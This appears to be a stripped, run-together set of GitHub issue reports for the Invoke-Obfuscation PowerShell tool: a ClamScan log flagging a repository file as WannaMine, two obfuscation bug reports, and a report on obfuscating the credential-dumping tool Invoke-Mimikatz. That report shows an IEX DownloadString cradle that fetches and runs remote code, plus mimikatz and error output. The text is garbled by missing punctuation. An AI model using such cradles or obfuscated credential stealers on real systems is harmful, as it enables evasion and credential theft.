rootkaliDownloadsInvokeObfuscationmaster clamscan v i Scanning rootDownloadsInvokeObfuscationmasterInvokeObfuscationpsd Scanning rootDownloadsInvokeObfuscationmasterOutEncodedAsciiCommandps Scanning rootDownloadsInvokeObfuscationmasterOutEncodedOctalCommandps Scanning rootDownloadsInvokeObfuscationmasterOutPowerShellLauncherps Scanning rootDownloadsInvokeObfuscationmasterREADMEmd Scanning rootDownloadsInvokeObfuscationmasterOutEncodedBXORCommandps Scanning rootDownloadsInvokeObfuscationmasterOutSecureStringCommandps Scanning rootDownloadsInvokeObfuscationmasterOutEncodedWhitespaceCommandps Scanning rootDownloadsInvokeObfuscationmasterLICENSE Scanning rootDownloadsInvokeObfuscationmasterOutCompressedCommandps Scanning rootDownloadsInvokeObfuscationmasterOutEncodedHexCommandps rootDownloadsInvokeObfuscationmasterOutEncodedHexCommandps WinDownloaderWannaMine FOUND Scanning rootDownloadsInvokeObfuscationmasterOutObfuscatedTokenCommandps Scanning rootDownloadsInvokeObfuscationmasterInvokeObfuscationps Scanning rootDownloadsInvokeObfuscationmasterOutEncodedBinaryCommandps Scanning rootDownloadsInvokeObfuscationmasterInvokeObfuscationpsm Scanning rootDownloadsInvokeObfuscationmasterOutObfuscatedAstps Scanning rootDownloadsInvokeObfuscationmasterOutObfuscatedStringCommandps Scanning rootDownloadsInvokeObfuscationmasterOutEncodedSpecialCharOnlyCommandps SCAN SUMMARY Known viruses Engine version Scanned directories Scanned files Infected files Data scanned MB Data read MB ratio Time sec m s For example OutObfuscatedAst ScriptBlock Iftrue a b c a b d e d If you apply any of the string obfuscations on a multiline string with a variable substitution the variable will be treated as a normal part of the string and thus wont be substituted Example script powershell script hello ps script WriteOutput ps After applying the Token String obfuscation on it powershell script f ohell ps CdH TRCscript CdH RePLACE ChaR ChaR ChaR ChaR RePLACE CdH ChaR WriteOutput ps Calling the obfuscated script results in this being printed script instead of hello As far as I know there is currently no way to obfuscate this script correctly without just abandoning the script obfuscation entirely Im using version by the way While doing bulk obfuscations using Command TOKEN ALL ENCODING STRING I got an error while calling OutObfuscatedStringCommand at line in InvokeObfuscationps Only PowerShell function out of had that issue but it has it consistently error select PSMessageDetails Exception SystemManagementAutomationParameterBindingValidationException Cannot validate argument on parameter ScriptBlock The argument is null or empty Provi de an argument that is not null or empty and then try the command again SystemManagementAutomationValidationMetadataException The argument is nu ll or empty Provide an argument that is not null or empty and then try the command again at SystemManagementAutomationValidateNotNullOrEmptyAttributeValidateObject arguments EngineIntrinsics engineIntrinsics at SystemManagementAutomationParameterBinderBaseBindParameterCommandParameterInternal parameter CompiledCommandParameter parameterMetadata Parame terBindingFlags flags End of inner exception stack trace at SystemManagementAutomationParameterBinderBaseBindParameterCommandParameterInternal parameter CompiledCommandParameter parameterMetadata Parame terBindingFlags flags at SystemManagementAutomationCmdletParameterBinderControllerBindParameterCommandParameterInternal argument MergedCompiledCommandParameter paramete r ParameterBindingFlags flags at SystemManagementAutomationCmdletParameterBinderControllerBindParameterUInt parameterSets CommandParameterInternal argument MergedCompiledCom mandParameter parameter ParameterBindingFlags flags at SystemManagementAutomationCmdletParameterBinderControllerBindParametersUInt parameterSets Collection arguments at SystemManagementAutomationCmdletParameterBinderControllerBindCommandLineParametersNoValidationCollection arguments at SystemManagementAutomationCmdletParameterBinderControllerBindCommandLineParametersCollection arguments at SystemManagementAutomationCommandProcessorBindCommandLineParameters at SystemManagementAutomationCommandProcessorBaseDoPrepareIDictionary psDefaultParameterValues at SystemManagementAutomationInternalPipelineProcessorStartBoolean incomingStream at SystemManagementAutomationInternalPipelineProcessorSynchronousExecuteEnumerateObject input End of stack trace from previous location where exception was thrown at SystemRuntimeExceptionServicesExceptionDispatchInfoThrow at SystemManagementAutomationInternalPipelineProcessorSynchronousExecuteEnumerateObject input at SystemManagementAutomationPipelineOpsInvokePipelineObject input Boolean ignoreInput CommandParameterInternal pipeElements CommandBaseAst pipeElementAsts CommandRedirection commandRedirections FunctionContext funcContext at lambdamethodClosure Object StrongBox InterpretedFrame TargetObject CategoryInfo InvalidData OutObfuscatedStringCommand ParameterBindingValidationException FullyQualifiedErrorId ParameterArgumentValidationErrorOutObfuscatedStringCommand ErrorDetails InvocationInfo SystemManagementAutomationInvocationInfo ScriptStackTrace at ShowMenu G Software PowerShell Modules InvokeObfuscationmaster InvokeObfuscationps line at InvokeObfuscation G Software PowerShell Modules InvokeObfuscationmaster InvokeObfuscationps line at ScriptBlock No file line PipelineIterationInfo Here is the zipped input PowerShell script triggering that error Function TestADPasswordzip Kind regards Geeeert Hey there First off really awesome project As the title says Ive been noticing that most obfuscated Powershell scripts specifically PowerSploit scripts seem to be incompatible on Powershell Heres some background on howwhat Im doing Im running the following InvokeObfuscation command on Powershell on Linux I have tested obfuscating the script on Powershell v on Win with the same results powershell PS homebyt bl d r PSVersionTable Name Value PSVersion alpha PSEdition Core PSCompatibleVersions BuildVersion GitCommitId Could not find file usrlibpowershellubuntu x powershellversion CLRVersion WSManStackVersion PSRemotingProtocolVersion SerializationVersion PS homebyt bl d r ImportModule InvokeObfuscationpsd PS homebyt bl d r InvokeObfuscation ScriptPath InvokeMimikatzps Command TOKENALL OUT testps Quiet Works as expected o Windows PS version Works as expected powershell PS C Users yomama PSVersionTable Name Value PSVersion PSEdition Desktop PSCompatibleVersions BuildVersion CLRVersion WSManStackVersion PSRemotingProtocolVersion SerializationVersion PS C Users yomama IEX NewObject NetWebclientDownloadString PS C Users yomama iNVokEmimIkATZ mimikatz x built on Nov A La Vie A LAmour Benjamin DELPY gentilkiwi benjamingentilkiwicom v oeeo with modules SNIP Windows PS version Here the IEX cradle works when executing the cmdlet however it errors out powershell PS C Users yomama PSVersionTable Name Value PSVersion WSManStackVersion SerializationVersion CLRVersion BuildVersion PSCompatibleVersions PSRemotingProtocolVersion PS C Users yomama IEX NewObject NetWebclientDownloadString PS C Users yomama InvokeMimikatz Exception calling GetDelegateForFunctionPointer with arguments Unable to cast object of type SystemManagementAutomationPSObject to type SystemType At line char vIRTuALAllOCEx f tvaGerIaBLE RefV CategoryInfo NotSpecified MethodInvocationException FullyQualifiedErrorId CatchFromBaseAdapterMethodInvoke Exception calling GetDelegateForFunctionPointer with arguments Unable to cast object of type SystemManagementAutomationPSObject to type SystemType At line char virTualfRee fVaeriabL f REFV CategoryInfo NotSpecified MethodInvocationException FullyQualifiedErrorId CatchFromBaseAdapterMethodInvoke Exception calling GetDelegateForFunctionPointer with arguments Unable to cast object of type SystemManagementAutomationPSObject to type SystemType At line char virTUaLPROTeCT faBLeIVAr RefV va CategoryInfo NotSpecified MethodInvocationException FullyQualifiedErrorId CatchFromBaseAdapterMethodInvoke Exception calling GetDelegateForFunctionPointer with arguments Unable to cast object of type SystemManagementAutomationPSObject to type SystemType At line char rEadpROcessMemoRY fVarIaBLE f CategoryInfo NotSpecified MethodInvocationException FullyQualifiedErrorId CatchFromBaseAdapterMethodInvoke Exception calling GetDelegateForFunctionPointer with arguments Unable to cast object of type SystemManagementAutomationPSObject to type SystemType At line char crEATEReMotetHReaD f ARIleABGeT CategoryInfo NotSpecified MethodInvocationException FullyQualifiedErrorId CatchFromBaseAdapterMethodInvoke Exception calling FromBase String with arguments Unable to cast object of type SystemManagementAutomationPSObject to type SystemType At line char Byte peBYtEs Byte fRiABletVaGE CategoryInfo NotSpecified MethodInvocationException FullyQualifiedErrorId CatchFromBaseAdapterMethodInvoke Cannot index into a null array At line char PeByTEs CategoryInfo InvalidOperation RuntimeException FullyQualifiedErrorId NullArray Cannot index into a null array At line char pEBYTES CategoryInfo InvalidOperation RuntimeException FullyQualifiedErrorId NullArray iNvOKEmeMorYlOaDLIBraRY Cannot bind argument to parameter pEBYTEs because it is null At line char mor PEBytes pebYTES ExeArgs ExeArgS CategoryInfo InvalidData iNvOKEmeMorYlOaDLIBraRY ParameterBindingValidationExceptio FullyQualifiedErrorId ParameterArgumentValidationErrorNullNotAllowediNvOKEmeMorYlOaDLIBraRY Cannot index into a null array At line char pEHaNDLE pElOAdedinfo CategoryInfo InvalidOperation RuntimeException FullyQualifiedErrorId NullArray Cannot index into a null array At line char rEMOTePEHaNdLe peloADedINFo CategoryInfo InvalidOperation RuntimeException FullyQualifiedErrorId NullArray PEHandle is null or IntPtrZero At line char throw f andull tne is PEH CategoryInfo OperationStopped PEHandle is null or IntPtrZeroString RuntimeException FullyQualifiedErrorId PEHandle is null or IntPtrZero Windows PS v Here the both the IEX cradle cmdlet error out powershell PS C Users yomama PSVersionTable Name Value CLRVersion BuildVersion PSVersion WSManStackVersion PSCompatibleVersions SerializationVersion PSRemotingProtocolVersion PS C Users yomama IEX NewObject NetWebClientDownloadString InvokeExpression Ampersand not allowed The operator is reserved for future use use to pass ampersand as a string At line char IEX NewObject NetWebClientDownloadString CategoryInfo ParserError InvokeExpression ParseException FullyQualifiedErrorId AmpersandNotAllowedMicrosoftPowerShellCommandsInvokeExpressionCommand PS C Users yomama ImportModule InvokeMimikatzps PS C Users yomama iNVokEmimIkATZ The variable cOMMaNd cannot be retrieved because it has not been set At C Users yomama Downloads InvokeMimikatzps char exEARgS cOMMaNd CategoryInfo InvalidOperation cOMMaNdToken RuntimeExc eption FullyQualifiedErrorId VariableIsUndefined The variable eXEArGS cannot be retrieved because it has not been set At C Users yomama Downloads InvokeMimikatzps char f CovokeInmmand ScriptBlock REmOTE ScRIpTbLock ArgumentList PEbYTES pEBYtES f V oid eXEArGS CategoryInfo InvalidOperation eXEArGSToken RuntimeExc eption FullyQualifiedErrorId VariableIsUndefined Array assignment failed because index was out of range At C Users yomama Downloads InvokeMimikatzps char PeByTEs CategoryInfo InvalidOperation Int RuntimeException FullyQualifiedErrorId IndexOutOfRange Array assignment failed because index was out of range At C Users yomama Downloads InvokeMimikatzps char pEBYTES CategoryInfo InvalidOperation Int RuntimeException FullyQualifiedErrorId IndexOutOfRange iNvOKEmeMorYlOaDLIBraRY Cannot bind argument to parameter pEBYTEs because it is an empty array At C Users yomama Downloads InvokeMimikatzps char peLoadedINFo f evokeMIn yyLoadLibrarmor PEBytes pebYTES ExeArgs ExeArgS CategoryInfo InvalidData iNvOKEmeMorYlOaDLIBraRY Par ameterBindingValidationException FullyQualifiedErrorId ParameterArgumentValidationErrorEmptyArrayNotAll owediNvOKEmeMorYlOaDLIBraRY The variable pELoADedinFo cannot be retrieved because it has not been set At C Users yomama Downloads InvokeMimikatzps char if pELoADedinFo eq fItemGEt fedHaBlaQjvariVaLUEzERo CategoryInfo InvalidOperation pELoADedinFoToken Runti meException FullyQualifiedErrorId VariableIsUndefined The variable pElOAdedinfo cannot be retrieved because it has not been set At C Users yomama Downloads InvokeMimikatzps char pEHaNDLE pElOAdedinfo CategoryInfo InvalidOperation pElOAdedinfoToken Runti meException FullyQualifiedErrorId VariableIsUndefined The variable peloADedINFo cannot be retrieved because it has not been set At C Users yomama Downloads InvokeMimikatzps char rEMOTePEHaNdLe peloADedINFo CategoryInfo InvalidOperation peloADedINFoToken Runti meException FullyQualifiedErrorId VariableIsUndefined InvokeCommand PEHandle is null or IntPtrZero At C Users yomama Downloads InvokeMimikatzps char f CovokeInmmand ScriptBlock R EmOTEScRIpTbLock ArgumentList PEbYTES pEBYtES f Void eXEArGS CategoryInfo OperationStopped PEHandle is null or IntPtrZe roString InvokeCommand RuntimeException FullyQualifiedErrorId PEHandle is null or IntPtrZeroMicrosoftPowerS hellCommandsInvokeCommandCommand At first I thought it might be an issue with PowerShell on Linux but I did the same thing on PowerShell on WIndows with the same results so this does seem to be a bug Let me know if you need any more information Cheers 